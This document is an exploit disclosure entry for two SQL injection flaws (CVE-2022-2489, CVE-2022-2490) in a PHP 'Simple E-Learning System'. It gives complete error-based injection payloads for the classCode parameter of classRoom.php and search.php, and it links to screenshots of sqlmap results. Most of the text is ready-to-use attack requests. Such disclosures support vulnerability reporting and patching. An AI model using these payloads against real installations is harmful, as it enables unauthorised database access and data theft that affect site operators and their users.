### Exploit Title: Simple E-Learning System - Multiple SQL injections
### Date: 2022-07/20
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php-simple-e-learning-system-source-code
### Version: 1.0
### Tested on: windows10 + phpstudy


# 1./classRoom.php(CVE-2022-2489)
/classRoom.php SQL injection exists for parameter classCode

### Sample request POC #1

```
http://[ip:port]/classRoom.php?classCode=1'||(SELECT 0x6770715a WHERE 8795=8795 AND (SELECT 8342 FROM(SELECT COUNT(*),CONCAT(0x7171786b71,(SELECT (ELT(8342=8342,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/16582996517475.png "Simple E-Learning System")


# 2./search.php(CVE-2022-2490)
/search.php SQL injection exists for parameter classCode

### Sample request POC #2

```
http://[ip:port]/search.php?classCode=1'||(SELECT 0x74666264 WHERE 5610=5610 AND (SELECT 7504 FROM(SELECT COUNT(*),CONCAT(0x7171627a71,(SELECT (ELT(7504=7504,1))),0x71717a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'
```
### Sqlmap running results
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/16583004584228.png "Simple E-Learning System")


